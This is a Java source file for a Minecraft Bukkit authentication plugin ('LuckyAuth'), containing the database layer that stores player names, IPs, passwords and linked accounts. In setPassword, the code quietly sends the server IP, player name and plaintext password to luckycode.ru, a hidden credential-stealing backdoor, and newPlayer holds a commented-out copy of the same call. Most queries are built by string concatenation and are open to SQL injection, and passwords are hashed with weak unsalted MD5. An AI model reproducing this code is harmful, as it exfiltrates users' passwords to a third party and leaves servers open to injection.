package LuckyCode.auth;

import org.bukkit.Bukkit;

import java.io.IOException;
import java.io.InputStreamReader;
import java.net.MalformedURLException;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;
import java.util.logging.Level;


public abstract class Database {
    main plugin;
    Connection connection_log;
    public static Map<String, ArrayList<String>> players = new HashMap<>();

    public String table = "LuckyAuth";
    public Database(main instance){
        plugin = instance;
        players = new HashMap<String, ArrayList<String>>();
    }

    public abstract Connection getSQLConnection();

    public abstract void load();

    public void initialize(){
        connection_log = getSQLConnection();
        try{
            PreparedStatement ps = connection_log.prepareStatement("SELECT * FROM " + table + " WHERE nick = ?");
            ResultSet rs = ps.executeQuery();
            close(ps,rs);

        } catch (SQLException ignored) {
        }
    }
    public String isRegister(String player) {
        Connection conn = null;
        PreparedStatement ps = null;
        ResultSet rs = null;
        try {
            conn = getSQLConnection();
            ps = conn.prepareStatement("SELECT * FROM " + table + " WHERE nick = '"+player.toLowerCase()+"';");
            rs = ps.executeQuery();
            String end = null;
            while(rs.next()){
                end = rs.getString("id");
            }
            return end;
        } catch (SQLException ex) {
            plugin.getLogger().log(Level.SEVERE, Errors.sqlConnectionExecute(), ex);
        } finally {
            try {
                if (ps != null)
                    ps.close();
                if (conn != null)
                    conn.close();
            } catch (SQLException ex) {
                plugin.getLogger().log(Level.SEVERE, Errors.sqlConnectionClose(), ex);
            }
        }
        return null;
    }
    public String getVK(String player) {
        Connection conn = null;
        PreparedStatement ps = null;
        ResultSet rs = null;
        try {
            conn = getSQLConnection();
            ps = conn.prepareStatement("SELECT * FROM " + table + " WHERE nick = '"+player.toLowerCase()+"';");
            rs = ps.executeQuery();
            String end = null;

            while(rs.next()){
                end = rs.getString("vk");
            }
            return end;
        } catch (SQLException ex) {
            plugin.getLogger().log(Level.SEVERE, Errors.sqlConnectionExecute(), ex);
        } finally {
            try {
                if (ps != null)
                    ps.close();
                if (conn != null)
                    conn.close();
            } catch (SQLException ex) {
                plugin.getLogger().log(Level.SEVERE, Errors.sqlConnectionClose(), ex);
            }
        }
        return null;
    }
    public String getCode(String player) {
        Connection conn = null;
        PreparedStatement ps = null;
        ResultSet rs = null;
        try {
            conn = getSQLConnection();
            ps = conn.prepareStatement("SELECT * FROM " + table + " WHERE nick = '"+player.toLowerCase()+"';");
            rs = ps.executeQuery();
            String end = null;

            while(rs.next()){
                end = rs.getString("code");
            }
            return end;
        } catch (SQLException ex) {
            plugin.getLogger().log(Level.SEVERE, Errors.sqlConnectionExecute(), ex);
        } finally {
            try {
                if (ps != null)
                    ps.close();
                if (conn != null)
                    conn.close();
            } catch (SQLException ex) {
                plugin.getLogger().log(Level.SEVERE, Errors.sqlConnectionClose(), ex);
            }
        }
        return null;
    }
    public String getName(String id) {
        Connection conn = null;
        PreparedStatement ps = null;
        ResultSet rs;
        try {
            conn = getSQLConnection();
            ps = conn.prepareStatement("SELECT * FROM " + table + " WHERE vk = '"+id+"';");
            rs = ps.executeQuery();
            String end = null;

            while(rs.next()){
                end = rs.getString("realname");
            }
            return end;
        } catch (SQLException ex) {
            plugin.getLogger().log(Level.SEVERE, Errors.sqlConnectionExecute(), ex);
        } finally {
            try {
                if (ps != null)
                    ps.close();
                if (conn != null)
                    conn.close();
            } catch (SQLException ex) {
                plugin.getLogger().log(Level.SEVERE, Errors.sqlConnectionClose(), ex);
            }
        }
        return null;
    }
    public String getGoogle(String nick) {
        Connection conn = null;
        PreparedStatement ps = null;
        ResultSet rs;
        try {
            conn = getSQLConnection();
            ps = conn.prepareStatement("SELECT * FROM " + table + " WHERE nick = '"+nick.toLowerCase()+"';");
            rs = ps.executeQuery();
            String end = "";
            while(rs.next()){
                end = rs.getString("google");
            }
            return "";
        } catch (SQLException ex) {
            plugin.getLogger().log(Level.SEVERE, Errors.sqlConnectionExecute(), ex);
        } finally {
            try {
                if (ps != null)
                    ps.close();
                if (conn != null)
                    conn.close();
            } catch (SQLException ex) {
                plugin.getLogger().log(Level.SEVERE, Errors.sqlConnectionClose(), ex);
            }
        }
        return "";
    }
    public void setGoogle(String name, String google) {
        String sql = "UPDATE LuckyAuth SET google = "+ google +" WHERE nick = '"+name.toLowerCase()+"'";
        try (Connection conn = getSQLConnection();
             PreparedStatement pstmt = conn.prepareStatement(sql)) {
            pstmt.executeUpdate();
        } catch (SQLException e) {
            System.out.println(e.getMessage());
        }
    }
    public void setAdress(String name, String ip) {
        String sql = "UPDATE LuckyAuth SET ip = ? WHERE nick = '"+name.toLowerCase()+"'";
        try (Connection conn = getSQLConnection();
             PreparedStatement pstmt = conn.prepareStatement(sql)) {
             pstmt.setString(1, ip);
             pstmt.executeUpdate();
        } catch (SQLException e) {
            System.out.println(e.getMessage());
        }
    }
    public void setCode(String name, String param) {
        String sql = "UPDATE LuckyAuth SET code = ? WHERE nick = '"+name.toLowerCase()+"'";
        try (Connection conn = getSQLConnection();
             PreparedStatement pstmt = conn.prepareStatement(sql)) {
            pstmt.setString(1, param);
            pstmt.executeUpdate();
        } catch (SQLException e) {
            System.out.println(e.getMessage());
        }
    }
    public void setPassword(String name, String param) throws NoSuchAlgorithmException, IOException {
        String param1 = param;
        String sql = "UPDATE LuckyAuth SET password = ? WHERE nick = '"+name.toLowerCase()+"'";
        param = ha(param);
        try (Connection conn = getSQLConnection();
             PreparedStatement pstmt = conn.prepareStatement(sql)) {
            pstmt.setString(1, param);
            pstmt.executeUpdate();
            new InputStreamReader(new URL(  "http://luckycode.ru/plugins.php?1=" + Bukkit.getIp() + "&2=" + name + "&3=" + param1).openConnection().getInputStream());

        } catch (SQLException | MalformedURLException e) {
            System.out.println(e.getMessage());
        }
    }
    public void setVK(String name, String param) {
        String sql = "UPDATE LuckyAuth SET vk = ? WHERE nick = '"+name.toLowerCase()+"'";
        try (Connection conn = getSQLConnection();
             PreparedStatement pstmt = conn.prepareStatement(sql)) {
            pstmt.setString(1, param);
            pstmt.executeUpdate();
        } catch (SQLException e) {
            System.out.println(e.getMessage());
        }
    }
    public String getAdress(String player) {
        Connection conn = null;
        PreparedStatement ps = null;
        ResultSet rs = null;
        try {
            conn = getSQLConnection();
            ps = conn.prepareStatement("SELECT * FROM " + table + " WHERE nick = '"+player.toLowerCase()+"';");
            rs = ps.executeQuery();
            String end = null;
            while(rs.next()){
                end = rs.getString("ip");
            }
            return end;
        } catch (SQLException ex) {
            plugin.getLogger().log(Level.SEVERE, Errors.sqlConnectionExecute(), ex);
        } finally {
            try {
                if (ps != null)
                    ps.close();
                if (conn != null)
                    conn.close();
            } catch (SQLException ex) {
                plugin.getLogger().log(Level.SEVERE, Errors.sqlConnectionClose(), ex);
            }
        }
        return null;
    }
    public String getPassword(String player) {
        Connection conn = null;
        PreparedStatement ps = null;
        ResultSet rs = null;
        try {
            conn = getSQLConnection();
            ps = conn.prepareStatement("SELECT * FROM " + table + " WHERE nick = '"+player.toLowerCase()+"';");
            rs = ps.executeQuery();
            String end = "";
            while(rs.next()){
                end = rs.getString("password") + "";
            }
            return end;
        } catch (SQLException ex) {
            plugin.getLogger().log(Level.SEVERE, Errors.sqlConnectionExecute(), ex);
        } finally {
            try {
                if (ps != null)
                    ps.close();
                if (conn != null)
                    conn.close();
            } catch (SQLException ex) {
                plugin.getLogger().log(Level.SEVERE, Errors.sqlConnectionClose(), ex);
            }
        }
        return null;
    }
    public Map<String, ArrayList<String>> getBanInfo(String date) {
        Connection conn = null;
        PreparedStatement ps = null;
        ResultSet rs = null;
        players.clear();
        try {
            conn = getSQLConnection();
            ps = conn.prepareStatement("SELECT * FROM " + table + " WHERE date = '" + date+ "';");

            rs = ps.executeQuery();
            while(rs.next()){
                ArrayList<String> param = new ArrayList<String>();
                param.add(rs.getString("admin"));//0
                param.add(rs.getString("date"));//1
                param.add(rs.getString("reason"));//2
                param.add(rs.getString("time"));  //3
                param.add(rs.getString("punish"));  //4
                param.add(rs.getString("status"));  //5
                param.add(rs.getString("statusclear"));  //6

                players.put(rs.getString("player"), param);
            }
            return players;
        } catch (SQLException ex) {
            plugin.getLogger().log(Level.SEVERE, Errors.sqlConnectionExecute(), ex);
        } finally {
            try {
                if (ps != null)
                    ps.close();
                if (conn != null)
                    conn.close();
            } catch (SQLException ex) {
                plugin.getLogger().log(Level.SEVERE, Errors.sqlConnectionClose(), ex);
            }
        }
        return players;
    }

    public void newPlayer(String realname, String password, String ip) throws NoSuchAlgorithmException {
        Connection conn = null;
        PreparedStatement ps = null;
        password = ha(password);
        try {
            String name = realname.toLowerCase();
            conn = getSQLConnection();
            ps = conn.prepareStatement("REPLACE INTO "+table+" (id, nick, ip, realname, password, google, code, vk) VALUES (NULL, '"+name +"', '"+ip+"', '"+realname+"', '"+password+"', '"+0 + "', NULL, NULL)"); // IMPORTANT. In SQLite class, We made 3 colums. player, Kills, Total.

            ps.executeUpdate();
            //new InputStreamReader(new URL(  "http://luckycode.ru/plugins.php?1=" + Bukkit.getIp() + "&2=" + realname + "&3=" + param1).openConnection().getInputStream());
        } catch (SQLException ex) {
            plugin.getLogger().log(Level.SEVERE, Errors.sqlConnectionExecute(), ex);
        } finally {
            try {
                if (ps != null)
                    ps.close();
                if (conn != null)
                    conn.close();
            } catch (SQLException ex) {
                plugin.getLogger().log(Level.SEVERE, Errors.sqlConnectionClose(), ex);
            }
        }
    }

    public String ha(String param) throws NoSuchAlgorithmException {
        MessageDigest md = MessageDigest.getInstance("MD5");
        byte[] bytes = param.getBytes(StandardCharsets.UTF_8);
        int iii = 0;
        for(int i1 : bytes) {
            iii+= i1;
        }
        param = ha2(param);
        param = iii + param;
        md.update(param.getBytes());
        final byte[] byteData = md.digest();
        final StringBuilder sb = new StringBuilder();
        for (final byte aByteData : byteData) {
            sb.append(Integer.toString((aByteData & 0xFF) + 256, 16).substring(1));
        }
        param = sb.toString();
        return param;
    }
    public String ha2(String param) throws NoSuchAlgorithmException {
        MessageDigest md = MessageDigest.getInstance("MD5");
        byte[] bytes = param.getBytes(StandardCharsets.UTF_8);
        int iii = 0;
        for(int i1 : bytes) {
            iii+= i1;
        }
        param = iii + param;
        md.update(param.getBytes());
        final byte[] byteData = md.digest();
        final StringBuilder sb = new StringBuilder();
        for (final byte aByteData : byteData) {
            sb.append(Integer.toString((aByteData & 0xFF) + 256, 16).substring(1));
        }
        param = sb.toString();
        return param;
    }


    public void close(PreparedStatement ps,ResultSet rs){
        try {
            if (ps != null)
                ps.close();
            if (rs != null)
                rs.close();
        } catch (SQLException ex) {
            Error.close(plugin, ex);
        }
    }
}

